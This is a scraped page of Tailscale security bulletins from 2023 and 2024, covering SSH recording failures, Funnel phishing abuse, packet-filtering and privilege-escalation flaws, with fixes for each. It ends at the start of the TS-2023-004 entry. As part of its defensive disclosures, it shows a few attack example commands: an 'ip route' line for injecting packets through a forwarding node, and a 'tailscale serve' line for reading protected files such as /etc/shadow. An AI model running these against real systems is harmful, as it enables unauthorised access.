=== Content from tailscale.com_f8f0b2ef_20250108_144039.html ===
[Say goodbye to your legacy VPNMake the switch to Tailscale](https://tailscale.com/switch)ProductSolutions[Enterprise](/enterprise)[Customers](/customers)[Docs](/kb/1017/install)[Blog](/blog)[Pricing](/pricing)[Download](/download)[Log in](https://login.tailscale.com/welcome)[Get started](https://login.tailscale.com/start)ProductMeet Tailscale

* [How it works](/blog/how-tailscale-works)
* [Why Tailscale](/why-tailscale)
* [WireGuard® for Enterprises](/wireguard-vpn)
* [Bring Tailscale to Work](/bring-tailscale-to-work)
Explore

* [Integrations](/integrations)
* [Features](/features)
* [Compare Tailscale](/compare)
* [Partnerships](/partnerships)
SolutionsBy use-case

* [Remote Access](/use-cases/remote-access)
* [Site-to-site Networking](/use-cases/site-to-site-networking)
* [Multi-Cloud Networking](/use-cases/multi-cloud-networking)
* [Kubernetes Networking](/use-cases/kubernetes)
* [Edge & IoT Deployments](/use-cases/iot)
* [Zero Trust Networking](/use-cases/zero-trust-networking)
* [AI Workloads](/use-cases/ai)
* [Secure SaaS](/use-cases/secure-saas)
* [Business VPN](/use-cases/business-vpn)
* [Homelab](/use-cases/homelab)
By role

* [DevOps](/solutions/devops)
* [IT](/solutions/it)
* [Security](/solutions/security)
[Enterprise](/enterprise)

[Customers](/customers)

[Docs](/kb/1017/install)

[Blog](/blog)

[Pricing](/pricing)

[Download](/download)[Get started](https://login.tailscale.com/start)[Login](https://login.tailscale.com/welcome)WireGuard is a registered trademark of Jason A. Donenfeld.[Terms of Service](/terms)[Privacy Policy](/privacy-policy) © 2025 Tailscale Inc. All rights reserved. Tailscale is a registered trademark of Tailscale Inc.
# Security Bulletins

Security notifications affecting the Tailscale client and service.

Read our [incident disclosure and notification policy](/security-policies/incident-disclosure). If you’re directly affected by a security issue in Tailscale, and [we have your contact information](/kb/1224/contact-preferences), we will contact you.

[Subscribe via RSS](/security-bulletins/index.xml)[Follow on Twitter](https://twitter.com/TailscaleSec)[Report a vulnerability](/kb/1071/security-notifications)
## Dec 4, 2024

### [TS-2024-013](#ts-2024-013)

***Description***: Potential for Tailscale SSH recording failures

#### What happened?

Tailscale [SSH recording](/kb/1246/tailscale-ssh-session-recording) deployments that enforce SSH recording
using `enforceRecorder` could fail to record session activity in several
situations.

##### Failure to write to the storage backend

If `tsrecorder` instances were unable to write to their configured storage, SSH
sessions would be allowed to execute for a few seconds (typically under one or
two) while the first output bytes failed to write.

A `tsrecorder` instance can fail to write to its configured storage for many
reasons, including:

* Misconfigured IAM permissions when using S3 for storage.
* Misconfigured file permissions when using the local filesystem for storage.
* Insufficient free space when using the local filesystem for storage.

`tsrecorder` now exercises the full set of required storage actions on startup.

##### Unreachable tsrecorder after a session is established

If `tsrecorder` instances became unreachable after a session had started, the
SSH session would take several minutes to terminate. This could happen when
`tsrecorder` went offline or when ACLs were updated to restrict access to
`tsrecorder` nodes.

The Tailscale client now detects `tsrecorder` unreachability within 30 seconds
and terminates the connection.

#### Who was affected?

Users of Tailscale SSH recording with `enforceRecorder` option and with
`tsrecorder` and Tailscale client versions prior to 1.78.0.

#### What was the impact?

Users connecting over [Tailscale SSH](kb/1193/tailscale-ssh) to nodes that enforce session
recording via `enforceRecorder` ACL flags would have been able to execute
commands briefly before having their access terminated due to recording
failures.

#### What do I need to do?

Update `tsrecorder` instances and Tailscale clients to version 1.78.0 or later.

## Oct 2, 2024

### [TS-2024-012](#ts-2024-012)

***Description***: Tailscale Funnel abused for phishing

#### What happened?

A malicious user abused [Tailscale Funnel](/kb/1223/funnel) to host a phishing page
targeting Facebook users. This user created multiple free Tailscale accounts to
use as an obfuscation/anonymity proxy for their VPS instance hosting the
phishing page.

We received the first report about a phishing page on September 23rd, 2024, and
took down the Funnel page the same day. We received the second report on October
1st, 2024, for the same phishing page on a different Tailscale account. We took
down the second page, added detection for new similar pages, and repeatedly
shut down new attacker accounts as they were created. After a few more
attempts, the attacker stopped creating new accounts.

#### Who was affected?

232 unique IP addresses accessed the attacker's Funnel nodes. Of those, 87 IP addresses made more
than one request, suggesting a possible phishing form submission.

#### What was the impact?

Some Facebook users could have been phished for their credentials. Since
Tailscale Funnel proxies can only see encrypted TLS traffic, we cannot confirm
whether anyone was successfully phished.

#### What do I need to do?

Don't use Tailscale Funnel for phishing.

## Jul 22, 2024

### [TS-2024-011](#ts-2024-011)

***Description***: SCIM group name disclosure via the ACL editor

#### What happened?

The [ACL editor](/kb/1338/acl-edit) in the admin console did not check [SCIM](/kb/1290/user-group-provisioning)
group names in the ACL rules against the tailnet name. This allowed tailnet A
to use SCIM groups from tailnet B in their ACL rules. A malicious user in
tailnet A could not gain access to target tailnet B this way. However, they
could use the fact that ACLs get saved without warnings to learn about valid
SCIM group names in other tailnets.

This issue was fixed on July 19th, 2024. A user trying to save ACLs with SCIM
group names from other tailnets will always receive a warning that these groups
do not exist, even if they do exist in other tailnets.

#### Who was affected?

None of the existing tailnets' ACLs appear to use SCIM group names from other
tailnets maliciously. A handful of customers used the wrong SCIM group names
from their production tailnets in their test tailnets by accident.

#### What was the impact?

A malicious user could learn about SCIM group names used in other tailnets.

#### What do I need to do?

No action is required.

## Jul 19, 2024

### [TS-2024-010](#ts-2024-010)

***Description***: Accidental ACL edits due to browser caching

#### What happened?

When switching tailnets in the admin console, an [Admin](/kb/1138/user-roles#admin) user
could overwrite the [ACLs](/kb/1018/acls) of one tailnet with pending changes to ACLs
from another tailnet.

When a user has unsaved ACL changes in the admin console, those changes are
cached in browser storage. If this user is a member of multiple tailnets,
tailnet A and tailnet B, and is editing ACLs for tailnet A, using the tailnet
switcher in the top-right corner of the page would not clear the cached ACL
changes correctly. In some rare cases, saving ACLs of tailnet B after the
switch would use the cached ACL contents from tailnet A.

A user can be an Admin in multiple tailnets when they use GitHub to log in, and are a member of GitHub organizations, or the user is [invited](/kb/1271/invite-any-user) to another tailnet and granted the Admin role.

Tailnet switching in the admin console was added on May 22nd, 2023. We fixed
this bug on July 17th, 2024.

#### Who was affected?

Any user who is an Admin in multiple tailnets and edited ACLs in the admin
console between May 22, 2023 and July 17th, 2024 could trigger this bug after
switching the active tailnet.

#### What was the impact?

An Admin user could overwrite the ACLs of one tailnet with ACLs from another
tailnet.

#### What do I need to do?

If you are an Admin of multiple tailnets using the same login name, review the
ACLs in your tailnets for correctness.

## Jun 27, 2024

### [TS-2024-009](#ts-2024-009)

***Description***: Potential for API credential disclosure over plaintext HTTP

#### What happened?

The [Tailscale API](/kb/1101/api) is primarily accessible over TLS-encrypted HTTP at
`api.tailscale.com`. It also has a limited plaintext HTTP handler to serve HTTP
to HTTPS redirects.

Browsers that connect over plaintext HTTP do not send cookies marked as `Secure`
to prevent them from being disclosed to network intermediaries.

However, API clients that connect using plaintext HTTP and send requests
with authentication tokens in headers have no such protections to prevent
disclosure.

Before June 26, 2024, the Tailscale API did not reject credentialed plaintext
API requests and instead served them HTTP 302 redirects as it would to browsers.
Typical HTTP client libraries handle redirects transparently, and consequently, the user
would not necessarily know their credentials had been exposed.

Starting on June 26, 2024, the Tailscale API now returns errors for all plaintext
HTTP requests that include credentials. Additionally, the Tailscale API now
automatically revokes API keys that it observes sent over HTTP and notifies
Tailnet security owners of this action.

#### Who was affected?

Any Tailscale API client that connected over plaintext HTTP using credentials
before June 26, 2024.

#### What was the impact?

API clients that connected over plaintext HTTP before June 26, 2024 would have
exposed their credentials to network intermediaries, risking them to theft and
replay.

#### What do I need to do?

No action is needed at this time.

#### Credits

Thanks to [Joachim Viide](https://jviide.iki.fi/) for reporting this issue.

## Jun 14, 2024

### [TS-2024-008](#ts-2024-008)

***Description***: Partial loss of audit and network flow logs

##### What happened?

An integer overflow in our logs processing service led to some customer logs
to be non-deterministically dropped with a probability of 14%.
The overflow condition first exhibited on June 7th, 2024 at 20:45 UTC and
was detected and resolved by June 14th, 2024 at 00:40 UTC.

##### Who was affected?

All tailnets that rely on audit and network flow logs have been affected.

##### What was the impact?

The 14% chance of dropped log entries affects storing of logs such as
[configuration audit logs](/kb/1203/audit-logging) and
[network flow logs](/kb/1219/network-flow-logs).
While logs can be retrieved for the timeframe that the overflow bug was active,
some fraction of the entries may be missing.

##### What do I need to do?

No action is needed at this time.

We fixed the bug, added additional error checking, and
deployed both to the logs processing service.

## Jun 12, 2024

### [TS-2024-007](#ts-2024-007)

***Description***: Incorrect DNS resolution with split DNS on macOS and iOS

##### What happened?

On Tailscale macOS and iOS clients with split DNS configurations (like [App
Connectors](/kb/1281/app-connectors) or [Restricted
Nameservers](/kb/1054/dns#nameservers)), lookups of bare tailnet node names
could in rare cases return incorrect answers. For example, if a node `mynode`
and an App Connector for `*.example.com` exist on a tailnet, DNS lookups for
`mynode` could return the answer for `mynode.example.com` instead of the local
tailnet IP. This mis-configuration is intermittent, and most often triggers for
a few seconds when switching device networks (for example from Wi-Fi to a phone
hotspot).

We fixed this bug in client version 1.68.0, and notified the security contacts
of potentially affected tailnets over email.

##### Who was affected?

All tailnets that use App Connectors or Restricted Domains, and have macOS or
iOS nodes could have been affected.

This bug is usually intermittently-triggered when switching networks in our
experience. Only lookups of bare domains, like `mynode` but not
`mynode.mytailnet.ts.net`, are at risk.

Note that not all split DNS domains are dangerous. Only domains where an
attacker can choose their FQDN to match a node name, and controls the
destination to receive non-TLS traffic could be abused.

We are not aware of any active exploitation of this vulnerability.

##### What was the impact?

For a split DNS domain `example.com`, an attacker with control over
`mynode.example.com` can impersonate a non-TLS server running on node `mynode`
on the tailnet. This attack is opportunistic and passive - it relies on the
user connecting to `mynode` using its bare domain and cannot be forced
remotely.

##### What do I need to do?

Upgrade your macOS and iOS clients to 1.68.0 or later.

## May 22, 2024

### [TS-2024-006](#ts-2024-006)

***Description***: Tailnet SSO provider migration impacting invited users

##### What happened?

When tailnets are created, they are associated with an [SSO
provider](/kb/1013/sso-providers) such as Google or Microsoft, requiring all members
of the tailnet to authenticate using that provider. In addition, Tailscale also
supports inviting [external users](/kb/1271/invite-any-user) to tailnets to allow
sharing with contractors, friends, or other collaborators who may use a
different SSO provider than that of the inviting tailnet to log in to
Tailscale.

Customers with an existing tailnet who wish to use a different SSO provider can
request to migrate via customer support. The internal tool used to perform these
migrations previously migrated the SSO provider for
*all members* of a tailnet, including those of invited external members.

We fixed this internal tool to migrate direct tailnet members, excluding invited
members on May 20, 2024.

We reverted the erroneous SSO provider changes and notified affected
users on May 23, 2024.

##### Who was affected?

55 users were invited external members of tailnets whose SSO provider was
subsequently migrated prior to May 20, 2024. We have notified the security
contacts for the tailnets where users were affected by this incident.

##### What was the impact?

Users whose SSO providers were erroneously migrated would have been
unable to log in to Tailscale during this time, as their SSO source
would differ from the one on record.

##### What do I need to do?

No action is needed at this time.

## May 8, 2024

### [TS-2024-005](#ts-2024-005)

***Description***: Insufficient inbound packet filtering in subnet routers and exit nodes

##### What happened?

In Tailscale versions earlier than 1.66.0, [exit nodes](/kb/1103/exit-nodes), [subnet
routers](/kb/1019/subnets), and [app connectors](/kb/1281/app-connectors), could
allow inbound connections to other tailnet nodes from their local area network
(LAN). This vulnerability only affects Linux exit nodes, subnet routers, and
app connectors in tailnets where [ACLs](/kb/1018/acls) allow `"src": "*"`, such as
with [default ACLs](/kb/1192/acl-samples#allow-all-default-acl).

Tailscale version 1.66.0 fixes the vulnerability. Additionally, a server-side
update changes the interpretation of `"src": "*"` to mitigate the issue
specifically for exit nodes.

Special thanks to [Hakan Ergan](https://www.linkedin.com/in/hakan-ergan/) for reporting a similar
concern that led us to discover this vulnerability.

##### Who was affected?

This affected the following nodes using Tailscale version 1.65 or earlier:

* Exit nodes on Linux
* Subnet routers on Linux
* App connectors on Linux
* Regular nodes on all platforms connecting to the above nodes

Tailnets with custom ACLs that do not use `"src": "*"` or any other value that
includes external IPs were not affected.

We are not aware of any active exploitation of this vulnerability.

##### What was the impact?

Devices outside of the tailnet, but on the same LAN as an exit node, subnet
router, or app connector could connect to ports on tailnet nodes that are
allowed by ACLs.

##### What do I need to do?

Upgrade the following nodes to 1.66.0 or later:

* Subnet routers on Linux
* App connectors on Linux
* Regular nodes on all platforms that use exit nodes [shared from other
  tailnets](/kb/1084/sharing#sharing--exit-nodes) or [Mullvad exit nodes](/kb/1258/mullvad-exit-nodes)

We recommend enabling auto-updates and updating all nodes to the latest
version, but it is not required to mitigate this vulnerability.

A server-side change mitigated this vulnerability for other types of affected
nodes.

##### Technical details

Below, we refer to exit nodes, subnet routers, and app connectors as
*packet-forwarding nodes*, because the details apply to all of them. Specific
types of packet-forwarding nodes are mentioned explicitly where their behavior
is different.

Before 1.66.0, packets between regular nodes and destination hosts behind
packet-forwarding nodes were filtered based on source/destination IP as
specified in tailnet ACLs. Specifying `"src": "*"` in ACLs is equivalent to
`"src": ["0.0.0.0/0", "::/0"]`, meaning any IP address. This allowed source IPs
outside of the tailnet to send packets to tailnet nodes via a packet-forwarding
node. This could be abused by malicious LAN hosts to connect into the tailnet
using a known tailnet node IP.

The attack only works on a LAN because:

* it relies on next-hop routing, which only works in a LAN
* destination IPs are in the subnet router's approved range, or in the [CGNAT
  range](/kb/1015/100.x-addresses) `100.64.0.0/10`, which are not routable over the Internet.

###### Attacks

Here are several attack scenarios.

**Packet-forwarding node on an untrusted LAN.**

![diagram showing a LAN machine connecting to a victim node](/files/images/security-bulletins/2024-05-08-01.svg)

A malicious host `10.0.0.1` on the same LAN as the packet-forwarding node
`10.0.0.2` could craft packets with destination IP of a tailnet node
`100.64.0.1` (using a command like `ip route add 100.64.0.1/32 via 10.0.0.2 dev eth0`) and send them to the packet-forwarding node. The packet-forwarding node
would accept them and forward them to the victim node. The victim node would
see a packet from `10.0.0.1` and accept it if the tailnet ACLs allow this
source IP.

This scenario is very similar to a legitimate use-case of
[site-to-site](/kb/1214/site-to-site) networking, where two subnets are bridged using
Tailscale subnet routers and the flag `--snat-subnet-routes=false`.

**Malicious shared exit node**

![diagram showing a malicious exit node connecting a the victim node](/files/images/security-bulletins/2024-05-08-02.svg)

A malicious exit node `100.64.0.4` from tailnet A could craft packets with
destination IP of tailnet B node `100.64.0.3` and any source IP other than
`100.64.0.4`. Due to the built-in [quarantining](/kb/1084/sharing#quarantine) of shared
nodes, packets from `100.64.0.4` are rejected.

###### Mitigations

We implemented 3 separate mitigations for these attacks.

**Redefine `"src": "*"` in ACLs**

While `*` is a convenient shorthand in ACLs, Tailscale users almost never need
to allow connections from any IP. In most cases users intend `*` as "all other
nodes in my tailnet". As a mitigation for this vulnerability, we redefined `*`
in `src` section of ACLs to include:

* all tailnet nodes
* all IPs from approved subnet routes

The inclusion of IPs from approved subnet routes is needed for the site-to-site
networking setup.

For users that need the old semantics of `*` we added a new
[`autogroup:danger-all`](/kb/1337/acl-syntax#src), which matches the old definition of `*`.

**Stateful packet filtering on packet-forwarding nodes**

On Linux packet-forwarding nodes we added stateful packet filtering. This means
that these nodes keep track of forwarded connections and only allow return
packets for existing outbound connections. Inbound packets that don't belong to
an existing connection are dropped.

Because routing is implemented differently on non-Linux platforms, this
mitigation is only necessary on Linux.

Stateful filtering is enabled by default, except for existing subnet routers
that set `--snat-subnet-routes=false`. You can disable stateful filtering using
`tailscale up --stateful-filtering=false`.

**Client-side quarantining of shared nodes**

[Quarantining](/kb/1084/sharing#quarantine) of shared nodes was implemented by a packet
filter sent from the Tailscale control plane. This packet filter instructs
nodes to drop any inbound connections from the source IP of the shared node. To
prevent malicious shared exit nodes from crafting packets with different source
IPs, additional client-side quarantining logic was added. The 1.66.0 and later
clients reject all inbound connections from quarantined nodes, regardless of
their source IP. This is similar to how the ["shields up"](/kb/1072/client-preferences#allow-incoming-connections) mode
works within the tailnet.

## May 6, 2024

### [TS-2024-004](#ts-2024-004)

***Description***: Unclear network flow logs collection status for alpha testers.

##### What happened?

When [network flow logs](/kb/1219/network-flow-logs) first entered private alpha, tailnet admins who were interested in testing out the feature had to request to be manually opted into the alpha testing track. When we subsequently introduced admin console settings for self-serve network flow logs for the public beta launch, these settings were not properly connected to the alpha testing track. As a result, for the small number of tailnets that volunteered for alpha testing, the admin console interface did not show that logs were still being collected as initially requested.

We fixed this bug on April 25, 2024 and the admin console now correctly shows the status of network flow logs for all users.

##### Who was affected?

15 tailnets were opted into network flow log collection through the alpha testing track that did not re-enroll through the admin console. We notified security contacts for the affected tailnets about this bug.

##### What was the impact?

The admin panel did not reflect the correct status for network flow log collection for affected tailnets, and admins of these tailnets may not have realized that network flow logs were still being collected.

##### What do I need to do?

No action is needed at this time.

## Apr 23, 2024

### [TS-2024-003](#ts-2024-003)

***Description***: Bug in SSH check mode with `checkPeriod` set to `0s`.

##### What happened?

[Check mode](/kb/1193/tailscale-ssh#configure-tailscale-ssh-with-check-mode) in Tailscale SSH forces an SSH client to periodically
re-authenticate when connecting to SSH servers. The period is configured via
the `checkPeriod` attribute in Tailscale ACLs, and defaults to 12 hours.

A bug in ACL parsing interpreted `"checkPeriod": "0s"` as unset, and used the
default period of 12 hours instead.

We deployed a fix for the bug in ACL parsing logic on 2024-04-23. SSH clients
in tailnets that set `"checkPeriod": "0s"` are now correctly prompted for
re-authentication on every connection.

Note that a special value `"checkPeriod": "always"` is the documented
recommended way to achieve this behavior.

We thank [Finch](https://twitter.com/plaidfinch) for reporting this issue.

##### Who was affected?

17 tailnets use Tailscale SSH with `"action": "check"` and `"checkPeriod": "0s"`. We notified security contacts for the affected tailnets about this bug.

##### What was the impact?

SSH clients in the affected tailnets were prompted to re-authenticate every 12
hours, instead of during each connection as intended by the tailnet
administrators.

##### What do I need to do?

No action is needed at this time.

## Jan 30, 2024

### [TS-2024-002](#ts-2024-002)

***Description***: We resolved an information disclosure vulnerability in the
[hello.ts.net](/kb/1073/hello) service.

##### What happened?

On January 15 2024, we became aware of a potential information disclosure
vulnerability in the `hello.ts.net` service, which could show the identity of a
different Tailscale user when loaded. The `hello.ts.net` service receives
identity information and public keys of nodes tied to their IP address. On
November 28 2023, we made a [change](/blog/choose-your-ip) to how IPs are assigned to
Tailscale nodes, making them globally non-unique. When the Tailscale service
assigned the same IP to multiple nodes, `hello.ts.net` would receive identity
information for one of the nodes at random. We confirmed on January 26 2024
that, if one of the other nodes with that IP loaded `hello.ts.net`, they would
see another user's name, email, and hostname.

The Tailscale Security Team immediately took `hello.ts.net` offline while the
fix was in progress. The issue has been fixed and the `hello.ts.net` service
was restored on January 29 2024.

##### Who was affected?

The incident was isolated to 10 users across 9 tailnets who could have had
their information leaked to other Tailscale users. We notified the tailnet
security contacts directly in accordance with our obligations under applicable
data privacy laws. Due to the random nature of the vulnerability, we cannot
confirm that all of those users were indeed affected.

Regular [shared nodes](/kb/1084/sharing) always see unique node IPs and were not
vulnerable in a manner similar to `hello.ts.net`.

##### What was the impact?

A small number of users had their name, email, and hostname potentially exposed
to other Tailscale users that had nodes sharing the same IP.

In addition, the `hello.ts.net` service was offline between January 26-29
2024. Several users reported being negatively impacted by this.

##### What do I need to do?

No action is needed at this time.

If you have a dependency on `hello.ts.net` as a probing target for Tailscale
connectivity, consider using [a different probing
mechanism](/kb/1073/hello#does-hellotsnet-have-a-reliability-guarantee).

## Jan 8, 2024

### [TS-2024-001](#ts-2024-001)

***Description***: On Windows before Tailscale version 1.52 and on Linux before
Tailscale 1.54, the `tailscale serve` and `tailscale funnel` features allowed
users to serve the contents of directories that their user account could not
access, but which the `tailscaled` service process could.

##### What happened?

A user could escalate their own file read access by running, for example,
`tailscale.exe serve http / C:\`, and then browsing to the local HTTP endpoint.

The issue can also occur on Linux if the local administrator enabled an operator
user ID with `tailscale up --operator=$USER`, as the `$USER` account could
`serve` itself files that it could not normally read.

##### Who is affected?

Owners of Windows deployments for which the users of Tailscale nodes do not also
have OS-level administrative access, and owners of Linux deployments where the
administrator enabled non-root `--operator` access.

This issue can only be triggered by a local user and cannot be triggered
remotely.

##### What is the impact?

This issue enables local privilege escalation (file read access). Access to
certain system files (such as `/etc/shadow` on Linux) can then be used to obtain
full administrative control over the host.

##### What do I need to do?

On Windows 10 and later, upgrade to Tailscale 1.52 ([released 30 October
2023](/changelog#2023-10-30-client)) or later, which resolves the issue.

On Windows 7 and 8, upgrade to Tailscale 1.44.3 ([released 8 Jan
2024](/changelog#2024-01-08-client)), which resolves the issue.

On Linux, upgrade to 1.54 ([released 15 November 2023](/changelog#2023-11-15-client)) or later,
which resolves the issue.

The best practice is to run the latest stable version, which as of this writing
is [1.56.1](/changelog#2023-12-15-client). Consider turning on [automatic updates](/blog/auto-update-beta).

Use [Tailscale ACLs](/kb/1223/funnel) to control the availability of Funnel.

## Dec 22, 2023

### [TS-2023-009](#ts-2023-009)

***Description***: [The OAuth implementation of Google Workspace](https://trufflesecurity.com/blog/google-oauth-is-broken-sort-of/) allows for the creation of Google accounts associated with a given Workspace domain that are not actually controlled by that workspace, e.g. alice+foo@example.com. As a result, these accounts may be used to retain access to systems that use Google Workspace SSO login even after the original account has been deactivated or removed.

##### What happened?

Tailscale uses Google as one of the possible identity providers for creating and joining a tailnet. Users who have emails with the same domain name can automatically sign in using SSO and be added to the corresponding tailnet (unless [user approval](https://tailscale.com/kb/1239/user-approval) is turned on for the tailnet)​​. The OAuth vulnerability reported by Truffle Security means that it is possible for an attacker to create a new personal Google Account that is attached to an alias of their legitimate Workspace account. This new account will not register as being part of the domain's Workspace, and thus cannot be removed by its admins. However, if the attacker then uses the new, spoofed Google Account to log into Tailscale, we would have treated it as a legitimate user in the tailnet. Thus, users could remain connected to a tailnet using this spoofed account even if their primary Workspace account has been disabled, e.g. after employee termination.

We became aware of the vulnerability on 2023-12-21 when its disclosure by Truffle Security was circulated widely. We deployed a remediation that prevents personal Google accounts from logging into tailnets associated with Workspace accounts on 2023-12-21.

##### Who is affected?

Everyone who uses Google Workspace to sign in.

##### What is the impact?

Tailnets that use Google Workspace as their SSO provider may have Tailscale users that do not have a corresponding user in the Google Workspace. Prior to 2023-12-21, this would have made it possible for those users to retain access to Tailscale after their SSO account was deleted. Following the remediation, these users can no longer login to Tailscale.

##### What do I need to do?

Tailscale admins should visit [the Users page of the Tailscale admin console](https://login.tailscale.com/admin/users) and audit the list of users to see if there are unknown addresses that should not be there. Admins can also [export this list of users](https://tailscale.com/kb/1229/export-user-list) as a CSV file to examine offline.

For extra security, you can turn on [user approval](https://tailscale.com/kb/1239/user-approval) for your Tailnet so that every new user of Tailscale has to be manually approved by an admin. Note: this does not mitigate against situations where the attacker is themselves an admin of Tailscale.

## Nov 1, 2023

### [TS-2023-008](#ts-2023-008)

***Description***: Privilege escalation bugs in the Tailscale
Kubernetes operator's API proxy allowed authenticated tailnet clients
to send Kubernetes API requests as the operator's service account.

Tailscale Kubernetes operator version v1.53.37 fixes the issue and
users of the operator who enable the API proxy functionality should
update as described below.

##### What happened?

The Tailscale Kubernetes operator can optionally act as [an API server
proxy](/kb/1437/kubernetes-operator-api-server-proxy)
for the cluster's Kubernetes API. This proxy allows authenticated
tailnet users to use their tailnet identity in Kubernetes
authentication and RBAC rules. The API server proxy uses
[impersonation
headers](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
to translate tailnet identities to Kubernetes identities.

The operator prior to v1.53.37 has two bugs in the forwarding logic,
which affects different modes of operation:

* In the default proxy mode that applies Tailscale identity to
  proxied requests, incorrect header sanitization allowed a request
  with a crafted `Connection` header to drop the impersonation
  headers from the proxied request. This caused the proxied request
  to be authenticated as the operator's service account, and inherit
  the operator's permissions.
* In the
  [no-auth](/kb/1437/kubernetes-operator-api-server-proxy#configuring-api-server-proxy-in-noauth-mode)
  proxy mode, which does not apply Tailscale identity to forwarded
  requests, a specially crafted request could similarly cause the
  proxied request to use the operator's identity, with similar
  results.

The bug was reported by [Mo Khan](https://github.com/enj) from Microsoft on
2023-11-01, and fixed on the same day.

##### Who is affected?

Tailnets using [the API server
proxy](/kb/1437/kubernetes-operator-api-server-proxy)
in Tailscale Kubernetes operator images with the following tags are affected:

* `unstable-v1.53.20` or earlier
* `unstable` deployed before the tag was updated to 1.53.37, some time
  on 2023-11-01.

Operator users running in the default operator configuration are
**not** affected, as the API proxy is not enabled by default.

##### What is the impact?

Authenticated tailnet users who have access to the operator's API
proxy can make requests to the Kubernetes API with operator
privileges. In the proxy mode that allows the operator to use
impersonation, this can be used for further privilege escalation to
other cluster identities.

External attackers **cannot** exploit this vulnerability without being
a member of the tailnet.

##### What do I need to do?

Update the Tailscale Kubernetes operator image to version unstable-v1.53.37 or
later.

If you used the official [operator manifest
file](https://github.com/tailscale/tailscale/blob/main/cmd/k8s-operator/deploy/manifests/operator.yaml),
download the new manifest file and run `kubectl apply -f manifest.yaml`.

If you used the Helm chart, set the
[`operatorConfig.image.tag`](https://github.com/tailscale/tailscale/blob/ca4c940a4d0ac3274ee91a58e4823afb3c92ae0b/cmd/k8s-operator/deploy/chart/values.yaml#L16)
to `unstable-v1.53.37` in the `values.yaml` file and run `helm upgrade <path-to-chart-directory> -n tailscale -f <path-to-values-file>`

If you wrote your own manifest or Helm chart, update the `k8s-operator` image
tag to `unstable-v1.53.37` and redeploy it.

## Oct 26, 2023

### [TS-2023-007](#ts-2023-007)

***Description***: Microsoft Defender is flagging Tailscale 1.46.1 as malware.
These classifications are false positives, and we are working with Microsoft to
resolve the situation.

As of 2023-10-27 1:05 AM UTC, we have confirmed that Microsoft have addressed
the false positive, meaning Defender no longer flags Tailscale 1.46.1 as
malware. A rescan of [tailscaled.exe 1.46.1 on VirusTotal](https://www.virustotal.com/gui/file/cfbf0c7ef964198e39f9cc97350626673468d311b8626c6b9bef6c95e40e569b) confirms this.

##### What happened?

Microsoft Defender was flagging Tailscale 1.46.1 as malware. This caused
Defender to quarantine the binaries, meaning they could not run.

We submitted Tailscale 1.46.1 to Microsoft to investigate the false positive,
who then updated Defender to avoid flagging this release as malware at
2023-10-27 1:05 AM UTC.

##### Who is affected?

People using Defender and Tailscale 1.46.1.

##### What is the impact?

Tailscale will not run on affected machines.

##### What do I need to do?

To resolve this issue on your own tailnet, you can take either or both of 2
approaches:

1. Update to a newer version of Tailscale. Newer versions are not affected by this problem.
2. Create an exception in Microsoft Defender. Microsoft has published [instructions explaining how to do this](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26).
3. Update Microsoft Defender.
## Aug 22, 2023

### [TS-2023-006](#ts-2023-006)

***Description***: An issue in the Tailscale client, combined with a behavior
of the UPnP implementations in some routers, could expose all UDP ports of a
node to external networks (usually the internet).

As of 2023-08-22 2:30 AM UTC, we have changed the Tailscale coordination server
to advise nodes to stop using UPnP for port mapping. In some cases this can
degrade NAT traversal and may cause some connections to route through DERP.
This may increase node-to-node latency and decrease throughput. Version 1.48.1
resolves the issue and re-enables port mapping via UPnP.

##### What happened?

Tailscale nodes use UPnP as one of the mechanisms to open UDP port forwarding
in routers to help with NAT traversal. Tailscale picks a node port and an
external router port and requests forwarding between them. On first start
Tailscale requested external port `0`, which many routers interpret as a
request to pick a random available port. However, some routers interpret this
as a request to listen on all external ports and forward traffic to matching
node ports.

Depending on the router's implementation of UPnP, a node could end up open to
all UDP traffic from external networks. If some processes listen on UDP ports
on the node, this could be used as a vector of attack against other software
running on the node.

Any firewall software running on the node would be able to stop unwanted UDP
packets, if configured to do so.

The bug was discovered and fixed on 2023-08-21, and the fix was published in
the 1.48.1 release.

##### Who is affected?

The only known vulnerable routers are those running the `miniupnpd` server,
versions 1.9 (2016) or earlier. Other UPnP server implementations may also be
vulnerable, but Tailscale is not aware of any as of 2023-08-22.

A small percentage of nodes listened on router port `0` via UPnP before the
mitigation was deployed. All nodes running vulnerable versions now have UPnP
port mapping disabled.

##### What is the impact?

Any node service listening on UDP ports from any IP could receive traffic from
external networks. This only applies to networks where the router implements
UPnP wildcard port support.

If such a service does not implement authentication and/or authorization,
allows packets to trigger sensitive actions, or has separate
remotely-exploitable vulnerabilities, the node could be compromised by an
attacker.

##### What do I need to do?

UPnP on vulnerable versions was disabled by the coordination server. Update
Tailscale to version 1.48.1 or later to restore NAT traversal using UPnP for
better node connectivity.

We do not recommend disabling UPnP or other port-mapping protocols on your
router. These protocols greatly improve connectivity for Tailscale and other
applications.

## Apr 28, 2023

### [TS-2023-005](#ts-2023-005)

***Description***: An issue in the Tailscale coordination server in device
reauthentication logic caused previously authenticated and tagged devices to
lose their [ACL tags](/kb/1068/acl-tags/) upon reauthentication.

##### What happened?

The logic that handles the reauthentication to a new identity on an
already-authenticated device with tags had a bug: instead of updating the
device’s logged-in identity to the newly authenticated user, the device’s
identity became that of the user who originally added it to the tailnet, without
any tags.

The bug was introduced on 2022-10-26, and discovered and remediated on
2023-04-21. The bug was discovered when troubleshooting a user-reported issue.

##### Who is affected?

189 tailnets triggered this bug in the course of normal use of Tailscale, either
directly by explicitly re-authenticating a device, or indirectly by using [fast
user switching](/kb/1225/fast-user-switching/) to switch between multiple
tailnets.

We have notified affected organizations where we have [security
contacts](/kb/1224/contact-preferences/#setting-the-security-issues-email).

##### What is the impact?

Devices that encountered the bug had their tags removed, which reverted the
device’s identity to that of the user who originally authenticated the device,
or the owner of the auth key that was originally used to authenticate the
device. In either case, this is the user listed as “Creator” in the Machines tab
of the admin panel. Depending on access rules in the tailnet policy file, this
could change the device’s network permissions.

We have analyzed the audit logs for affected tailnets, and found no evidence of
deliberate exploitation. In most instances, device owners noticed the incorrect
outcome of reauthentication, and corrected the device’s state themselves.

##### What do I need to do?

**If you were not contacted by Tailscale, no action is required.**  If you were
contacted by Tailscale, reapply the desired tags to affected devices in the
admin console, or by reauthenticating the devices. Tailscale has deployed a fix
to the coordination server as of 2023-04-21, and notified affected
organizations.

## Apr 4, 2023

### [TS-2023-004](#ts-2023-004)

